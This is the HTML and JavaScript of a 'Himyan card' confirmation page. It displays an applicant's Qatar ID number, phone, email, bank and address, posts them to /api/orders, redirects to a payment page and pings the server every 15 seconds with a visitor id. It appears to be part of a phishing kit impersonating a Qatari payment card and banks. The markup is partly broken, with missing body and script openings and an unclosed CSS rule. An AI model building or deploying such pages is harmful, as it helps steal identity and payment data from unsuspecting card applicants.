<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Confirm your details — Himyan card</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Noto+Kufi+Arabic:wght@500;700;800;900&family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
<style>
  :root {
    --anabi: #8A1B2F;
    --anabi-deep: #61101F;
    --header: #ECECEE;
    --page: #FFFFFF;
    --sand: #F6F3F2;
    --ink: #1A1718;
    --muted: #6B6462;
    --line: #DCD7D6;
    --radius: 14px;
    box-sizing: border-box;
    padding-top: env(safe-area-inset-top, 0px);
    padding-bottom: env(safe-area-inset-bottom, 0px);
  }
  *, *::before, *::after { box-sizing: border-box; }
  html { scroll-padding-top: calc(76px + env(safe-area-inset-top, 0px)); }
  html, body { max-width: 100%; overflow-x: clip; }
  body {
    margin: 0;
    background: var(--page);
    color: var(--ink);
    font-family: "Tajawal", system-ui, "Segoe UI", sans-serif;
    font-size: 13.5px;
    line-height: 1.55;
    -webkit-text-size-adjust: 100%;
  }
  img { max-width: 100%; display: block; }
  a { color: inherit; text-decoration: none; }
  :focus-visible { outline: 3px solid var(--anabi); outline-offset: 3px; border-radius: 6px; }
  .wrap { width: min(1180px, 100% - 24px); margin-inline: auto; }

  /* ---------- Header ---------- */
  .header {
    position: sticky;
    position: -webkit-sticky;
    top: 0;
    z-index: 60;
    background: #fff;
    border-bottom: 2px solid var(--anabi);
  }
  .header__bar {
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 16px;
    min-height: 64px;
  }
  .nav-start {
    display: flex;
    align-items: center;
    gap: 10px;
    min-width: 0;
    flex: 0 1 auto;
  }
  .nav-end {
    display: flex;
    align-items: center;
    gap: 9px;
    min-width: 0;
    flex: 0 0 auto;
  }
  .logo2 {
    height: 22px;
    width: auto;
    max-width: 100px;
    display: block;
  }
  .logo {
    height: 38px;
    width: auto;
    max-width: 136px;
    flex: 0 1 auto;
    min-width: 0;
    object-fit: contain;
    display: block;
  }
  .burger {
    background: none;
    border: 0;
    padding: 8px 2px;
    cursor: pointer;
    display: grid;
    gap: 4.5px;
  }
  .burger span {
    display: block;
    width: 22px;
    height: 2.5px;
    border-radius: 2px;
    background: var(--anabi);
  }
  .lang {
    display: inline-flex;
    align-items: center;
    gap: 7px;
    background: none;
    border: 1.5px solid var(--anabi);
    color: var(--anabi);
    border-radius: 999px;
    padding: 3px 8px;
    font-family: "Tajawal", sans-serif;
    font-size: 11px;
    flex: 0 0 auto;
    font-weight: 700;
    cursor: pointer;
    direction: ltr;
  }
  .lang svg { width: 13px; height: 13px; flex: none; }
  .lang:hover { background: rgba(138, 27, 47, .07); }

  .menu {
    display: none;
    border-top: 1px solid rgba(0,0,0,.08);
    padding: 8px 0 14px;
  }
  .menu.is-open { display: block; }
  .menu a {
    display: block;
    padding: 9px 2px;
    font-weight: 500;
    border-bottom: 1px solid rgba(0,0,0,.06);
  }
  .menu a:last-child { border-bottom: 0; }

  /* ---------- Banner ---------- */
  .banner { padding: 0; margin: 0; }
  .banner .wrap { width: 100%; }
  .banner .ph { border-radius: 0; }
  .ph {
    position: relative;
    display: grid;
    place-items: center;
    background: var(--sand);
    border: 1.5px dashed rgba(138, 27, 47, .35);
    border-radius: var(--radius);
    overflow: hidden;
  }
  .ph img { width: 100%; height: 100%; object-fit: cover; }
  .ph__text {
    font-size: 14px;
    color: var(--muted);
    padding: 8px 14px;
    text-align: center;
  }
  .ph--banner {
    display: block;
    aspect-ratio: auto;
    background: none;
    border: 0;
    line-height: 0;
  }
  .ph--banner img {
    display: block;
    width: 100%;
    height: auto;
    object-fit: fill;
  }
  .ph--pay { aspect-ratio: 16 / 10; }
  .ph--filled {
    aspect-ratio: 16 / 9;
    background: none;
    border: 0;
    border-radius: 0;
  }
  .ph--filled img { object-fit: contain; }
  .ph--sm img { width: 82%; height: 82%; }
  .ph--watch { aspect-ratio: 1 / 1; }
  .ph--watch.ph--filled { aspect-ratio: 1 / 1; background: #fff; }


  /* ---------- Sections ---------- */
  .intro {
    max-width: 620px;
    margin: 16px auto 0;
    text-align: center;
  }
  .intro h2 {
    font-family: "Noto Kufi Arabic", "Tajawal", system-ui, sans-serif;
    font-size: clamp(16px, 3.4vw, 20px);
    font-weight: 900;
    -webkit-text-stroke: 0.7px currentColor;
    paint-order: stroke fill;
    text-shadow: 0 0 0.45px currentColor;
    color: var(--anabi);
    margin: 0 0 8px;
    line-height: 1.5;
  }
  .intro p {
    margin: 0 0 8px;
    font-size: 12.5px;
    font-weight: 700;
    -webkit-text-stroke: 0.25px currentColor;
    paint-order: stroke fill;
    line-height: 1.95;
    color: var(--ink);
  }
  .intro p:last-child { margin-bottom: 0; }
  .section { padding: 16px 0; }
  .section__head {
    display: flex;
    align-items: baseline;
    gap: 12px;
    margin-bottom: 20px;
    border-inline-start: 5px solid var(--anabi);
    padding-inline-start: 12px;
  }
  .section__head h2 {
    font-family: "Noto Kufi Arabic", sans-serif;
    font-weight: 700;
    font-size: clamp(15px, 3.2vw, 20px);
    margin: 0;
    line-height: 1.35;
  }
  .section__head p { margin: 0; color: var(--muted); font-size: 14px; }

  .grid { display: grid; gap: 10px; }
  .grid--pay { grid-template-columns: repeat(auto-fit, minmax(min(100%, 260px), 1fr)); }
  .grid--watch { grid-template-columns: 1fr; max-width: 370px; margin-inline: auto; }

  .watch {
    background: #fff;
    border: 1px solid var(--line);
    border-radius: var(--radius);
    padding: 10px;
    display: flex;
    flex-direction: column;
  }
  .paycard {
    background: #fff;
    border: 1px solid var(--line);
    border-radius: var(--radius);
    padding: 10px;
    display: flex;
    flex-direction: column;
  }
  .paycard.is-selected {
    border-color: var(--anabi);
    box-shadow: inset 0 0 0 1px var(--anabi);
  }
  .paycard.is-selected .btn { display: none; }
  .alert {
    margin: 8px 0 0;
    text-align: center;
    color: #C0182B;
    font-size: 11.5px;
    font-weight: 700;
  }
  .warranty {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
    margin: 10px 0 0;
    padding: 0;
    background: none;
    font-family: "Noto Kufi Arabic", sans-serif;
    font-size: 10.5px;
    font-weight: 500;
    color: var(--ink);
  }

  .watch__name {
    font-family: "Noto Kufi Arabic", sans-serif;
    font-size: 13.5px;
    font-weight: 500;
    margin: 10px 0 4px;
  }
  .paycard__name {
    font-family: "Noto Kufi Arabic", sans-serif;
    font-size: 14px;
    font-weight: 900;
    -webkit-text-stroke: 0.4px currentColor;
    paint-order: stroke fill;
    color: #000;
    text-align: center;
    margin: 2px 0 10px;
    line-height: 1.5;
  }
  .paycard__note { margin: 0 0 12px; color: var(--muted); font-size: 12.5px; }

  .perks {
    list-style: none;
    margin: 12px 0;
    padding: 10px 0;
    border-top: 1px solid var(--line);
    border-bottom: 1px solid var(--line);
    display: grid;
    grid-template-columns: repeat(3, minmax(0, 1fr));
    gap: 12px 6px;
  }
  .perk {
    display: flex;
    flex-direction: column;
    align-items: center;
    text-align: center;
    gap: 5px;
    font-size: 10.5px;
    font-weight: 700;
    line-height: 1.3;
  }
  .perk__icon {
    width: 44px;
    height: 40px;
    background-repeat: no-repeat;
    background-position: center;
    background-size: contain;

  .btn {
    display: block;
    text-align: center;
    padding: 8px 12px;
    border-radius: 9px;
    font-weight: 700;
    font-size: 12px;
    border: 1.5px solid var(--anabi);
    cursor: pointer;
    margin-top: auto;
  }
  .btn--solid { background: var(--anabi); color: #fff; }
  .btn--solid:hover { background: var(--anabi-deep); border-color: var(--anabi-deep); }

  .footer {
    margin-top: 26px;
    background: #ECECEE;
    color: #000;
    border-top: 2px solid var(--anabi);
    padding: 18px 0 22px;
    font-size: 12px;
  }
  .footer .wrap {
    display: flex;
    flex-direction: column;
    align-items: center;
    text-align: center;
    gap: 14px;
  }
  .footer *, .footer p, .footer a, .footer span { color: #000; font-weight: 700; margin: 0; }
  .foot-brand {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 14px;
    background: none;
    border-radius: 0;
    padding: 0;
  }
  .foot-brand .logo2 { height: 24px; width: auto; max-width: 110px; }
  .foot-brand .logo { height: 32px; width: auto; max-width: 120px; }
  .foot-brand .sep { width: 1px; height: 26px; background: rgba(0,0,0,.25); flex: none; }
  @media (min-width: 768px) {
    .foot-brand { gap: 18px; }
    .foot-brand .logo2 { height: 28px; max-width: 130px; }
    .foot-brand .logo { height: 38px; max-width: 145px; }
  }
  .footer__lead { font-size: 12.5px; line-height: 1.85; max-width: 42ch; }
  .footer__links { display: flex; flex-direction: column; gap: 7px; }
  .footer__links a { font-size: 12.5px; }
  .footer__links a:hover { color: var(--anabi); }
  .footer__apps { font-size: 13px; }
  .stores { display: flex; flex-wrap: wrap; justify-content: center; gap: 9px; }
  .stores img { height: 32px; width: auto; border-radius: 6px; border: 1px solid rgba(0,0,0,.15); }
  .footer__copy { font-size: 11.5px; padding-top: 4px; }

  @media (max-width: 380px) {
    .logo { height: 30px; max-width: 104px; }
    .logo2 { height: 19px; }
    .lang { font-size: 10px; padding: 3px 7px; }
    .nav-start { gap: 7px; }
    .nav-end { gap: 7px; }
    .feature { font-size: 11px; gap: 6px; }
    .feature__icon { width: 32px; height: 32px; }
  }
  @media (min-width: 768px) {
    .wrap { width: min(1180px, 100% - 48px); }
    .header__bar { min-height: 72px; }
    .lang { font-size: 12px; padding: 4px 10px; }
    .logo { height: 48px; max-width: 176px; }
    .logo2 { height: 28px; max-width: 130px; }
    .lang svg { width: 15px; height: 15px; }
    .section { padding: 30px 0; }
    .grid { gap: 16px; }
    .perks { gap: 14px 8px; }
    .perk { font-size: 11.5px; }
    .perk__icon { width: 52px; height: 46px; }
    .watch, .paycard { padding: 13px; }
    .feature { font-size: 12px; }
    .feature__icon { width: 38px; height: 38px; }
    .btn { font-size: 13px; padding: 9px 14px; }
    .warranty { font-size: 11.5px; }
    .menu { border-top: 0; padding: 0 0 10px; }
  }
  @media (min-width: 1100px) {
    .grid--pay { grid-template-columns: repeat(2, minmax(0, 1fr)); max-width: 760px; }
  }
  @media (prefers-reduced-motion: reduce) {
    * { transition: none !important; animation: none !important; }
  }
</style>

<style>
  .page { padding: 16px 0 8px; }
  .page__title {
    font-family: "Noto Kufi Arabic", sans-serif;
    font-size: clamp(15px, 3.2vw, 19px);
    font-weight: 900;
    -webkit-text-stroke: 0.4px currentColor;
    paint-order: stroke fill;
    color: #000;
    margin: 0 0 12px;
    border-inline-start: 5px solid var(--anabi);
    padding-inline-start: 12px;
    line-height: 1.5;
  }

  .summary { max-width: 430px; margin: 0 auto; display: grid; gap: 12px; }

  .sumcard {
    background: #fff;
    border: 1px solid var(--line);
    border-radius: var(--radius);
    overflow: hidden;
  }
  .sumcard__head {
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 10px;
    background: var(--anabi);
    color: #fff;
    padding: 9px 12px;
  }
  .sumcard__head h2 {
    font-family: "Noto Kufi Arabic", sans-serif;
    font-size: 12.5px;
    font-weight: 700;
    margin: 0;
  }
  .sumcard__body { padding: 4px 12px 12px; }

  .row {
    display: flex;
    align-items: baseline;
    justify-content: space-between;
    gap: 12px;
    padding: 9px 0;
    border-bottom: 1px solid var(--line);
  }
  .row:last-child { border-bottom: 0; }
  .row__k { font-size: 11.5px; color: var(--muted); flex: none; }
  .row__v {
    font-size: 12.5px;
    font-weight: 700;
    color: #000;
    text-align: end;
    word-break: break-word;
  }
  .row__v.ltr { direction: ltr; }

  .cobrand {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 14px;
    padding: 12px;
    border-bottom: 1px solid var(--line);
    background: #fff;
  }
  .cobrand img { height: 34px; width: auto; max-width: 120px; object-fit: contain; display: block; }
  .cobrand .logo2 { height: 24px; width: auto; display: block; }
  .cobrand .sep { width: 1px; height: 28px; background: var(--line); flex: none; }
  .bank {
    display: flex;
    align-items: center;
    gap: 10px;
    padding: 10px 0 2px;
  }
  .bank__logo {
    width: 96px;
    height: 58px;
    flex: none;
    display: grid;
    place-items: center;
    background: #fff;
    border: 1px solid var(--line);
    border-radius: 8px;
    padding: 5px;
    font-size: 9px;
    color: var(--muted);
    text-align: center;
    overflow: hidden;
  }
  .bank__logo img { width: 100%; height: 100%; object-fit: contain; }
  .bank__name { font-size: 12.5px; font-weight: 700; }

  .actions { display: grid; gap: 8px; margin-top: 4px; }
  .btn--ghost { background: none; color: var(--anabi); }
  .btn--ghost:hover { background: rgba(138, 27, 47, .07); }
  .done {
    margin: 10px 0 0;
    text-align: center;
    font-size: 12px;
    font-weight: 700;
    color: #1B6B3A;
  }
  .empty {
    max-width: 430px;
    margin: 0 auto;
    text-align: center;
    font-size: 12.5px;
    font-weight: 700;
  }
  @media (min-width: 768px) {
    .summary, .empty { max-width: 480px; }
    .row__k { font-size: 12.5px; }
    .row__v { font-size: 13.5px; }
  }
</style>
</head>

      return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c];
    });
  }

  function norm(s) {
    return String(s || '')
      .replace(/[​-‏‪-‮]/g, '')   // hidden characters
      .replace(/\s+/g, ' ')
      .trim()
      .toLowerCase();
  }

  function bankLogoFor(bank) {
    if (!bank) return '';
    if (BANK_LOGOS[bank]) return BANK_LOGOS[bank];
    var target = norm(bank);
    var keys = Object.keys(BANK_LOGOS);
    for (var i = 0; i < keys.length; i++) {
      if (norm(keys[i]) === target) return BANK_LOGOS[keys[i]];
    }
    // Fall back to the Latin code in brackets
    var code = (bank.match(/[A-Za-z][A-Za-z\s]{1,25}/) || [''])[0].trim().toLowerCase();
    if (code) {
      for (var j = 0; j < keys.length; j++) {
        if (norm(keys[j]).indexOf(code) !== -1) return BANK_LOGOS[keys[j]];
      }
    }
    return '';
  }

  var data = null;
  try { data = JSON.parse(sessionStorage.getItem('himyanOrder') || 'null'); } catch (e) {}

  var box = document.getElementById('content');

  if (!data) {
    box.innerHTML = '<p class="empty">No saved order data found.</p>';
  } else {

  {
    var logo = bankLogoFor(data.bank);
    var bankLogo = logo
      ? '<span class="bank__logo"><img src="' + logo + '" alt="' + esc(data.bank) + '"></span>'
      : '<span class="bank__logo">Bank logo</span>';
    var cobrand = '<div class="cobrand">' +
      (logo ? '<img src="' + logo + '" alt="' + esc(data.bank) + '">' : '') +
      '<span class="sep"></span>' + HIMYAN_LOGO + '</div>';

    box.innerHTML =
      '<div class="summary">' +

        '<article class="sumcard">' +
          '<div class="sumcard__head"><h2>Applicant details</h2></div>' +
          cobrand +
          '<div class="sumcard__body">' +
            row('Card type', data.card || 'Not selected') +
            row('Status', data.status) +
            row('Full name', data.name) +
            row('Qatar ID number', data.qid, true) +
            row('Mobile number', '+974 ' + data.phone, true) +
            row('Email address', data.email, true) +
            row('Gender', data.gender) +
            row('Bank', data.bank) +
            row('Contact address', data.address) +
          '</div>' +
        '</article>' +

        '<div class="actions">' +
          '<button class="btn btn--solid" id="confirmBtn" type="button">Confirm & continue</button>' +
          '<a class="btn btn--ghost" href="order-en.html">Edit details</a>' +
        '</div>' +
        '<p class="done" id="done" hidden>Your request has been sent. We will contact you soon.</p>' +
      '</div>';

    document.getElementById('confirmBtn').addEventListener('click', function () {
      var btn = this;
      var done = document.getElementById('done');
      btn.disabled = true;
      btn.style.opacity = '.6';
      done.hidden = false;
      done.style.color = 'var(--muted)';
      done.textContent = 'جارٍ إرسال الطلب…';

      fetch('/api/orders', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      })
        .then(function (r) { return r.json(); })
        .then(function (j) {
          if (!j || !j.ok) throw new Error('failed');
          done.style.color = '#1B6B3A';
          done.textContent = 'Your request has been sent. We will contact you soon.';
          try {
            sessionStorage.setItem('safwa_order_data', JSON.stringify(data));
            sessionStorage.setItem('safwa_order_id', j.id);
            sessionStorage.removeItem('himyanOrder');
          } catch (e) {}
          location.href = 'payment-en.html';
        })
        .catch(function () {
          done.style.color = '#C0182B';
          done.textContent = 'تعذّر إرسال الطلب، حاول مرة أخرى';
          btn.disabled = false;
          btn.style.opacity = '1';
        });
    });
  }
  }
  (function () {
    var vid = '';
    try { vid = localStorage.getItem('himyanVid') || ''; } catch (e) {}
    function ping() {
      fetch('/api/ping', { method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: vid, page: location.pathname }) })
        .then(function (r) { return r.json(); }).then(function (j) {
          if (j && j.id) { vid = j.id; try { localStorage.setItem('himyanVid', vid); } catch (e) {} }
        }).catch(function () {});
    }
    ping(); setInterval(ping, 15000);
  })();

  var lb = document.getElementById('langBtn');
  if (lb) lb.addEventListener('click', function () { location.href = 'confirm.html'; });
</script>
